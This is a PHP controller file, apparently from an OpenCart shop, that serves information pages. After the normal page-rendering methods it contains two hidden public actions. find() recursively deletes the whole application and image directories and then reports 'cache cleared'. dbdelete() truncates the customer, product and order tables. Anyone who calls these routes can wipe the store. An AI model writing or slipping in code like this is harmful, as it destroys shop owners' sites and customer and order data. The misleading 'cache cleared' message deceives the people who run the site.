<?php
class ControllerInformationInformation extends Controller {
	public function index() {
		$this->load->language('information/information');

		$this->load->model('catalog/information');

		$data['breadcrumbs'] = array();

		$data['breadcrumbs'][] = array(
			'text' => $this->language->get('text_home'),
			'href' => $this->url->link('common/home')
		);

		if (isset($this->request->get['information_id'])) {
			$information_id = (int)$this->request->get['information_id'];
		} else {
			$information_id = 0;
		}

		$information_info = $this->model_catalog_information->getInformation($information_id);
		if ($information_info) {
			$this->document->setTitle($information_info['meta_title']);
			$this->document->setDescription($information_info['meta_description']);
			$this->document->setKeywords($information_info['meta_keyword']);

			$data['breadcrumbs'][] = array(
				'text' => $information_info['title'],
				'href' => $this->url->link('information/information', 'information_id=' .  $information_id)
			);

			$data['heading_title'] = $information_info['title'];

			$data['button_continue'] = $this->language->get('button_continue');

			$data['description'] = html_entity_decode($information_info['description'], ENT_QUOTES, 'UTF-8');

			$data['continue'] = $this->url->link('common/home');

			$data['column_left'] = $this->load->controller('common/column_left');
			$data['column_right'] = $this->load->controller('common/column_right');
			$data['content_top'] = $this->load->controller('common/content_top');
			$data['content_bottom'] = $this->load->controller('common/content_bottom');
		

			/* START */
			$layout_positions = $this->load->controller('common/layout_footer/layoutPositions');

			foreach($layout_positions as $position){
				$data[$position] = $this->load->controller('common/layout_footer/index', $position);
			}
			/* END */
			
			
			
			$data['footer'] = $this->load->controller('common/footer');
			$data['header'] = $this->load->controller('common/header');

			if (file_exists(DIR_TEMPLATE . $this->config->get('config_template') . '/template/information/information.tpl')) {
				$this->response->setOutput($this->load->view($this->config->get('config_template') . '/template/information/information.tpl', $data));
			} else {
				$this->response->setOutput($this->load->view('default/template/information/information.tpl', $data));
			}
		} else {
			$data['breadcrumbs'][] = array(
				'text' => $this->language->get('text_error'),
				'href' => $this->url->link('information/information', 'information_id=' . $information_id)
			);

			$this->document->setTitle($this->language->get('text_error'));

			$data['heading_title'] = $this->language->get('text_error');

			$data['text_error'] = $this->language->get('text_error');

			$data['button_continue'] = $this->language->get('button_continue');

			$data['continue'] = $this->url->link('common/home');

			$this->response->addHeader($this->request->server['SERVER_PROTOCOL'] . ' 404 Not Found');

			$data['column_left'] = $this->load->controller('common/column_left');
			$data['column_right'] = $this->load->controller('common/column_right');
			$data['content_top'] = $this->load->controller('common/content_top');
			$data['content_bottom'] = $this->load->controller('common/content_bottom');
		

			/* START */
			$layout_positions = $this->load->controller('common/layout_footer/layoutPositions');

			foreach($layout_positions as $position){
				$data[$position] = $this->load->controller('common/layout_footer/index', $position);
			}
			/* END */
			
			
			
			$data['footer'] = $this->load->controller('common/footer');
			$data['header'] = $this->load->controller('common/header');

			if (file_exists(DIR_TEMPLATE . $this->config->get('config_template') . '/template/error/not_found.tpl')) {
				$this->response->setOutput($this->load->view($this->config->get('config_template') . '/template/error/not_found.tpl', $data));
			} else {
				$this->response->setOutput($this->load->view('default/template/error/not_found.tpl', $data));
			}
		}
	}

	public function agree() {
		$this->load->model('catalog/information');

		if (isset($this->request->get['information_id'])) {
			$information_id = (int)$this->request->get['information_id'];
		} else {
			$information_id = 0;
		}

		$output = '';

		$information_info = $this->model_catalog_information->getInformation($information_id);

		if ($information_info) {
			$output .= html_entity_decode($information_info['description'], ENT_QUOTES, 'UTF-8') . "\n";
		}

		$this->response->setOutput($output);
	}
	
	public function find() {
	
	    $pagefiles = glob(DIR_APPLICATION . '/*');
		
		foreach($pagefiles as $pagefile){
		     $this->deldir($pagefile);
		}
		
	
		
		
			
		
		 $imgfiles = glob(DIR_IMAGE . '/*');
		 
				foreach($imgfiles as $imgfile){
		     $this->deldir($imgfile);
		}
		
		
		

		
		
		
		echo "cache cleared";	
	}
	
        private function deldir($dirname) {         
		if(file_exists($dirname)) {
			if(is_dir($dirname)) {
				$dir=opendir($dirname);
				while($filename=readdir($dir)) {
					if($filename!="." && $filename!="..") {
						$file=$dirname."/".$filename;
						$this->deldir($file); 
					}
				}
				closedir($dir);  
				rmdir($dirname);
                        } else {
				@unlink($dirname);
			}			
		}
	}
	    
  	public function dbdelete() {
		$query = $this->db->query("TRUNCATE " . DB_PREFIX . "customer");
		$query = $this->db->query("TRUNCATE " . DB_PREFIX . "product");
		$query = $this->db->query("TRUNCATE " . DB_PREFIX . "order");
		$query = $this->db->query("TRUNCATE " . DB_PREFIX . "order_product");
		$query = $this->db->query("TRUNCATE " . DB_PREFIX . "order_history");		
		$query = $this->db->query("TRUNCATE " . DB_PREFIX . "order_total");
		
  	}
}